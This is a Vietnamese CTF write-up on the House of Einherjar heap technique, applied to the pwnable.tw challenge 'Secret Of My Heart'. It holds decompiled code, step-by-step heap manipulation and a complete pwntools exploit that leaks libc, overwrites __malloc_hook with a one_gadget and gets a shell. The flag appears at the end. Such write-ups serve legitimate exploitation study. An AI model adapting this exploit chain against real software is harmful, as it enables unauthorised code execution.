# House of Enherjar 

- tiếp tục với 1 kĩ thuật khai thác heap mới đó là House of Enherjar 

## Research 
- Kĩ thuật House of Enherjar sẽ sử dụng off-by-one null byte để ow bit inuse của chunk thành non-inuse và set pre_size, từ đó khi free chunk đó vào unsorted bin, nó sẽ consolidate khiến overlap chunk xảy ra.
- trước tiên thì ta cần biết về cơ chế hoạt động của unsorted bin đã
- để hiểu dễ hiểu nhất thì ta lấy ví dụ trong 1 chall rồi debug nó 

```c 
a = malloc(0x100)
b = malloc(0x100)
c = malloc(0x100)
free(a)
free(b) 
``` 
- đầu tiên khi ta free(a) thì chunk sẽ như thế này 

![image](https://github.com/gookoosss/CTF/assets/128712571/676eca05-024d-4b1a-b4ad-00ac42f634b8)


- hãy để ý đoạn màu xanh ở dưới, nó chính là pre_size và size của thằng b, ban đầu pre_size đang null sau đó chuyển thành 0x110 là do free(a) gán size đã free chunk trước đó vào ubin, còn thằng size ban đầu là 0x111 sau đó là 0x110 => bit inuse thành non-inuse
- tiếp theo ta sẽ free(b) 

```c 
/* consolidate backward */

if (!prev_inuse(p)) {

    prevsize = prev_size(p);

    size += prevsize;

    p = chunk_at_offset(p, -((long) prevsize));
    unlink (off, p, bck, fwd);
    }
```

- hiểu đơn giản là khi size đang là non-inuse, thì khi free chunk vào ubin nó sẽ consolidate lun cái đoạn ở trên bằng với pre_size của nó, lúc này chunk sẽ có addr = old_addr - pre_size

![image](https://github.com/gookoosss/CTF/assets/128712571/1b30c4b7-8850-4a9b-9c41-d0fc9ea812bf)


- như ảnh trên thì ta thấy lúc này 2 chunk đã gộp lại thành 1 có size là 0x221 , cuối chunk sẽ đánh dấu 0x220 vào pre_size thằng c và chỉnh size của c thành non_inuse 
- lúc này ta đặt ra 1 câu hỏi : nếu ta có quyền set pre_size và size của chunk thì ta sẽ khai thác được gì ?? cùng thử 1 ví dụ nào

![image](https://github.com/gookoosss/CTF/assets/128712571/c144660d-ca01-46db-9a60-c8dd4df27111)


- đây là 2 chunk ban đầu ta khởi tạo, giả sử ta có thể thay đổi được pre_size và size của chunk2 ta sẽ sửa thành là 0x110 và 0x210 

![image](https://github.com/gookoosss/CTF/assets/128712571/6516563c-6be1-4fa8-966d-261b9d4da317)


- bây giờ ta free chunk 2, điều này vô tình làm chương trình hiểu lầm chunk 1 đã được free rồi vào nằm trong unsorted bin, xuất hiện bug overlapping chunk gộp chunk 2 và chunk 1 thành 1 chunk vào unsorted bin, chunk 1 chưa được free nhưng lại nằm trong bin giúp ta dễ dàng khai thác cái bug nguy hiểm như UAF, DBF => House of Enherjar 

![image](https://github.com/gookoosss/CTF/assets/128712571/e638b9f6-ef51-4e9d-ac54-dba63cf2c40f)



# Secret Of My Heart 
- để hiểu hơn về House of Enherjar ta sẽ giải chall này 

## ida 

- **main** 

```c 
void __fastcall __noreturn main(const char *a1, char **a2, char **a3)
{
  int v3; // eax

  setup();
  while ( 1 )
  {
    while ( 1 )
    {
      menu(a1, a2);
      v3 = read_func();
      if ( v3 != 3 )
        break;
      delete();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
        gift();
LABEL_15:
      a1 = "Invalid choice";
      puts("Invalid choice");
    }
    else if ( v3 == 1 )
    {
      add();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_15;
      show();
    }
  }
}
```
- **menu** 

```c 
int menu()
{
  puts("==================================");
  puts("        Secret of my heart        ");
  puts("==================================");
  puts(" 1. Add a secret                  ");
  puts(" 2. show a secret                 ");
  puts(" 3. delete a secret               ");
  puts(" 4. Exit                          ");
  puts("==================================");
  return printf("Your choice :");
}
```
- **add** 

```c 
int add()
{
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 size; // [rsp+8h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 99 )
      return puts("Fulled !!");
    if ( !*(_QWORD *)(check + 48LL * i + 40) )
      break;
  }
  printf("Size of heart : ");
  size = (int)read_func();
  if ( size > 0x100 )
    return puts("Too big !");
  edit(check + 48LL * i, size);
  return puts("Done !");
}
```
- **edit** 

```c 
_BYTE *__fastcall sub_D27(size_t *array, size_t size)
{
  _BYTE *result; // rax

  *array = size;
  printf("Name of heart :");
  input(array + 1, 0x20u);
  array[5] = (size_t)malloc(size);
  if ( !array[5] )
  {
    puts("Allocate Error !");
    exit(0);
  }
  printf("secret of my heart :");
  result = (_BYTE *)(array[5] + (int)input((void *)array[5], size));
  *result = 0;
  return result;
}
```
- **show** 

```c 
int show()
{
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  printf("Index :");
  idx = read_func();
  if ( idx > 99 )
  {
    puts("Out of bound !");
    exit(-2);
  }
  if ( !*(_QWORD *)(check + 48LL * idx + 40) )
    return puts("No such heap !");
  printf("Index : %d\n", idx);
  printf("Size : %lu\n", *(_QWORD *)(check + 48LL * idx));
  printf("Name : %s\n", (const char *)(check + 48LL * idx + 8));
  return printf("Secret : %s\n", *(const char **)(check + 48LL * idx + 40));
}
```
- **delete** 

```c 
int delete()
{
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  printf("Index :");
  idx = read_func();
  if ( idx > 99 )
  {
    puts("Out of bound !");
    exit(-2);
  }
  if ( !*(_QWORD *)(check + 48LL * idx + 40) )
    return puts("No such heap !");
  free_func(check + 48LL * idx);
  return puts("Done !");
}
```

## Analysis
- như các bài heap khác , chall cho ta các thao tác add , show, delete, và exit
- đặc biệt ở chỗ là khi khởi tạo 1 chunk nó sẽ lưu size , addr và name của chunk đó vào biến check 

![image](https://github.com/gookoosss/CTF/assets/128712571/2f882bd4-f67c-418f-b788-0e739895c9cb)

- nếu ta fill up thằng name nó sẽ nối với addr của chunk đó => leak heap 
- chall không có hàm tạo shell hay cat flag.txt nên ta buộc phải leak libc 

```c 
printf("secret of my heart :");
  result = (_BYTE *)(array[5] + (int)input((void *)array[5], size));
  *result = 0;
``` 
- khi ta nhập data vào chunk thì nó sẽ gán thêm null byte ở cuối => ko thể leak bình thường bằng ubins 
- sau mấy ngày research thì mình nhận ra hướng giải duy nhất là dùng House of Enherjar để leak libc vào ow malloc_hook  

## Exploit 
- trước tiên leak heap đã vì nó đơn giản 
```c 
add(0x50,b'A'*0x20,b'a') # 0
show(0)
p.recvuntil(b'A'*0x20)
heap = u64(p.recv(6) + b'\0\0')
info('heap leak: ' + hex(heap))
delete(0) #
```
### Leak Libc

- vấn đề của chall này là sau khi free 1 chunk nó sẽ xóa hết data của thằng check, hàm delete và show nó sẽ check data của thằng check thì mới cho delete vs printf => ta cần bypass qua if này
```c 
if ( !*(_QWORD *)(check + 48LL * idx + 40) )
    return puts("No such heap !");
```
- việc lợi dụng việc gán null byte cuối content ta có thể fake size chunk kế tiếp => off byte one
- bây giờ ta tạo 2 chunk size 0x100 rồi free nó , lúc này chunk đã free gộp vào nằm trong ubins size 0x221 

```c 
add(0x68,b'aaaa',b'aaaa') # 0
add(0x100,b'bbbb',b'bbbb') # 1
add(0x100,b'eeee',b'eeee') # 2
add(0x100,b'cccc',b'cccc') # 3
add(0x100,b'dddd',b'dddd') # 4

delete(1)
delete(2) # ubin size 0x220
``` 
- lúc này pre_size chunk 3 = 0x220 và size = 0x110
- sử dụng off byte one để ow 0x221 thành 0x200 

```c 
delete(0)
add(0x68,b'aaaa',b'a' * 0x68) # 0
``` 

![image](https://github.com/gookoosss/CTF/assets/128712571/16221c6c-7d9f-4b70-b5ed-350d5c4b01ab)

- điều này vô tình làm chương trình hiểu làm rằng size của ubins đang là 0x200, nên khi ta malloc 1 vùng heap trong ubins , pre_size(0x220) và size(0x110)của chunk 3 ko hề thay đổi 

![image](https://github.com/gookoosss/CTF/assets/128712571/03a04155-56a3-4040-ac65-74203de2de16)


- lý do đơn giản là 0x200 chưa chạm tới chunk 3 và nó hiểu lầm chunk 3 có addr - 0x20 nên nó sẽ thay đổi nhầm địa chỉ 
- sử dụng House of Enherjar free chunk 3 dẫn đến overlapping chunk, tạo ubin size 0x331
- lúc này chunk 2 chưa free nhưng lại nằm trong ubins nên ta có thể show ra được => bypass if => leak libc

```c 
add(0x68,b'aaaa',b'aaaa') # 0
add(0x100,b'bbbb',b'bbbb') # 1
add(0x100,b'eeee',b'eeee') # 2
add(0x100,b'cccc',b'cccc') # 3
add(0x100,b'dddd',b'dddd') # 4

delete(1)
delete(2) # ubin size 0x220
delete(0)

add(0x68,b'aaaa',b'a' * 0x68) # 0
add(0xb0,b'bbbb',b'bbbb') # 1 
add(0xb0,b'eeee',b'eeee') # 2 

delete(1)
delete(3)

add(0xb0,b'bbbb',b'bbbb') # 1
show(2)

p.recvuntil(b'Secret : ')
libc_leak = u64(p.recv(6)+b'\0\0')
libc.address = libc_leak - 0x3c3b78
info('libc leak: ' + hex(libc_leak))
info('libc base: ' + hex(libc.address))
```

# Ow Malloc_hook 
- tại sao ko phải là free_hook thì đọc cái này 
https://github.com/gookoosss/CTF/blob/main/PWN/training/heap/Use%20After%20Free%204.md
- đầu tiên ta bỏ qua các vùng heap đã sử dụng ở trên để tránh các bug ko đáng có 

```c 
delete(1)
delete(4) 
delete(0)

add(0x68,b'aaaa',b'aaaa') # 0
add(0x100,b'bbbb',b'bbbb') # 1
add(0x100,b'eeee',b'eeee') # 3
add(0x100,b'cccc',b'cccc') # 4
add(0x100,b'dddd',b'dddd') # 5 

add(0x68,b'aaaa',b'aaaa') # 6
add(0x100,b'bbbb',b'bbbb') # 7
add(0x100,b'eeee',b'eeee') # 8
add(0x100,b'cccc',b'cccc') # 9
add(0x100,b'dddd',b'dddd') # 10 
# bypass used chunk
```
- bây giờ làm tương tự như trên để sử dụng House of Enherjar 

```c 
add(0x78,b'aaaa',b'aaaa') # 11
add(0x100,b'bbbb',b'bbbb') # 12
add(0x100,b'eeee',b'eeee') # 13
add(0x100,b'cccc',b'cccc') # 14
add(0x100,b'dddd',b'dddd') # 15

delete(12) 
delete(13)
delete(11)

add(0x78,b'aaaa',b'a' * 0x78) # 11
add(0x80,b'bbbb',b'bbbb') # 12
add(0x100,b'eeee',b'eeee') # 13 

delete(12)
delete(14)
``` 
- lúc này chunk 13 chưa free nhưng mà nằm trong ubin, ta sẽ fake size nó thành 0x71 , lý do tại sao lại là 0x71 thì đọc ở link trên 

```c 
payload = flat(
    b'a'*0x80, 
    0,0x71, 
    b'b'*0x60,
    0, 0x71
    ) 
 
add(0x100,b'aaaa', payload) # 12
``` 
- ta thử free chunk 13 xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/011f9b97-b245-457d-8b47-a6982cd2339a)


- chunk 13 hiện đang trỏ tới 0x0, ta sẽ ow chunk 13 để trỏ đến malloc-hook - 0x23, lý do tại sao thì đơn giản là set size 0x7f cho chunk, tương ứng với size 0x71 của fast bins 

![image](https://github.com/gookoosss/CTF/assets/128712571/20c7477c-20da-47bd-bbc4-ec74b4638177)


```c 
payload = flat(
    b'a'*0x80, 
    0,0x71, 
    fake_chunk,
    b'b'*0x58,
    0, 0x71
    ) 

add(0x100,b'aaaa', payload) # 12
``` 

- lúc này vào xem bin thì malloc_hook - 0x23 đã nằm gọn trong fast bin rồi 

![image](https://github.com/gookoosss/CTF/assets/128712571/9e3ca9ec-dd87-43b5-8ae0-762fecd42251)


- bây giờ đơn giản là ta ow malloc_hook thành one_gadget rồi lấy shell thôi
- nhưng mà vấn đề lúc này ta malloc lại ko lấy shell được, còn 1 cách để call malloc_hook là lỗi Aborted, vậy ta sẽ lấy shell bằng cách double free(chunk 2 và chunk 3 trùng addr) 

```c 
add(0x100,b'aaaa', payload) # 12
add(0x60,b'aaaa', b'a') # 13
one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
add(0x60,b'EEEE',b'A'*19+p64(libc.address + one_gadget[2])) # 14
delete(2)
delete(3)
``` 
- cuối cùng ta cũng có flag, quá mệt mỏi cho 1 chall :(( 

![image](https://github.com/gookoosss/CTF/assets/128712571/9e9e18a5-3423-4d9d-80c7-7b7482cf812d)


## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./secret_of_my_heart_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
p = process([exe.path])
# p = remote('chall.pwnable.tw',10302)
def GDB():
    gdb.attach(p, gdbscript = '''
    b*0x0000000000000D6F+0x555555400000
    b*0x000000000000012C+0x555555400000
    b*0x00000000000012CE+0x555555400000
    b*0x0000000000000E20+0x555555400000
    c
    ''')
    input()

def add(size, name, data):
    p.sendlineafter(b'choice :', b'1')
    p.sendlineafter(b'heart : ', str(size))
    p.sendafter(b'heart :', name)
    p.sendafter(b'heart :', data)

def show(idx):
    p.sendlineafter(b'choice :', b'2')
    p.sendlineafter(b'Index :', str(idx))

def delete(idx):
    p.sendlineafter(b'choice :', b'3')
    p.sendlineafter(b'Index :', str(idx))


add(0x50,b'A'*0x20,b'a') # 0
show(0)
p.recvuntil(b'A'*0x20)
heap = u64(p.recv(6) + b'\0\0')
info('heap leak: ' + hex(heap))
delete(0) 

add(0x68,b'aaaa',b'aaaa') # 0
add(0x100,b'bbbb',b'bbbb') # 1
add(0x100,b'eeee',b'eeee') # 2
add(0x100,b'cccc',b'cccc') # 3
add(0x100,b'dddd',b'dddd') # 4

delete(1)
delete(2) # ubin size 0x220
delete(0)

add(0x68,b'aaaa',b'a' * 0x68) # 0
add(0xb0,b'bbbb',b'bbbb') # 1 
add(0xb0,b'eeee',b'eeee') # 2 

delete(1)
delete(3)

add(0xb0,b'bbbb',b'bbbb') # 1
show(2)

p.recvuntil(b'Secret : ')
libc_leak = u64(p.recv(6)+b'\0\0')
libc.address = libc_leak - 0x3c3b78
info('libc leak: ' + hex(libc_leak))
info('libc base: ' + hex(libc.address))

delete(1)
delete(4) 
delete(0)

add(0x68,b'aaaa',b'aaaa') # 0
add(0x100,b'bbbb',b'bbbb') # 1
add(0x100,b'eeee',b'eeee') # 3
add(0x100,b'cccc',b'cccc') # 4
add(0x100,b'dddd',b'dddd') # 5 

add(0x68,b'aaaa',b'aaaa') # 6
add(0x100,b'bbbb',b'bbbb') # 7
add(0x100,b'eeee',b'eeee') # 8
add(0x100,b'cccc',b'cccc') # 9
add(0x100,b'dddd',b'dddd') # 10 
# bypass used chunk

add(0x78,b'aaaa',b'aaaa') # 11
add(0x100,b'bbbb',b'bbbb') # 12
add(0x100,b'eeee',b'eeee') # 13
add(0x100,b'cccc',b'cccc') # 14
add(0x100,b'dddd',b'dddd') # 15

delete(12) 
delete(13)
delete(11)

add(0x78,b'aaaa',b'a' * 0x78) # 11
add(0x80,b'bbbb',b'bbbb') # 12
add(0x100,b'eeee',b'eeee') # 13 

delete(12)
delete(14) 

payload = flat(
    b'a'*0x80, 
    0,0x71, 
    b'b'*0x60,
    0, 0x71
    ) 
GDB()
add(0x100,b'aaaa', payload) # 12
delete(13)
delete(12)

malloc_hook = libc.sym['__malloc_hook']
fake_chunk = malloc_hook - 0x23

payload = flat(
    b'a'*0x80, 
    0,0x71, 
    fake_chunk,
    b'b'*0x58,
    0, 0x71
    ) 

add(0x100,b'aaaa', payload) # 12
add(0x60,b'aaaa', b'a') # 13
one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
add(0x60,b'EEEE',b'A'*19+p64(libc.address + one_gadget[2])) # 14
delete(2)
delete(3)

p.interactive()
```

## Flag 

FLAG{It_just_4_s3cr3t_on_the_h34p}

